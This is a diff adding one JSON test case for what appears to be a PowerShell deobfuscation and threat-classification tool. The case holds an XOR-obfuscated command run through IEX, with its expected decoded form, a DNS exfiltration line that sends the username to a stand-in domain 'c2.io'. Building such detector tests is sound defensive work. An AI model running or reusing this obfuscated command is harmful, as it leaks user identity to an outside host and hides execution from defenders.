@@ -1,0 +1,44 @@
+{
+  "id": "xor-fill-19",
+  "category": "ps-crypto",
+  "algorithm": "XOR-multi",
+  "command_line": "$k=[Text.Encoding]::UTF8.GetBytes('AKEY'); $c=[byte[]](47,56,41,54,46,32,48,41,97,46,61,63,40,39,104,125,105,60,45,54,32,38,44,112,111,40,119,119,40,36); $o=[byte[]]::new($c.Length); for($i=0;$i -lt $c.Length;$i++){$o[$i]=$c[$i] -bxor $k[$i%$k.Length]}; IEX ([Text.Encoding]::UTF8.GetString($o))",
+  "stage_ladder": [
+    {
+      "name": "utf8-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "byte-array-parse",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "xor-multi-inline-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "utf8-decode",
+      "recoverable": true,
+      "reason": ""
+    }
+  ],
+  "key_status": "inline-static",
+  "expected_plaintext": "nslookup exfil-$(whoami).c2.io",
+  "expected_iocs": [],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1059.001",
+    "T1140"
+  ],
+  "expected_verdict": "malicious",
+  "expected_confidence_min": 0.8,
+  "notes": "",
+  "source": "nivxray-rc41-crypto",
+  "license": "CC-BY-4.0"
+}
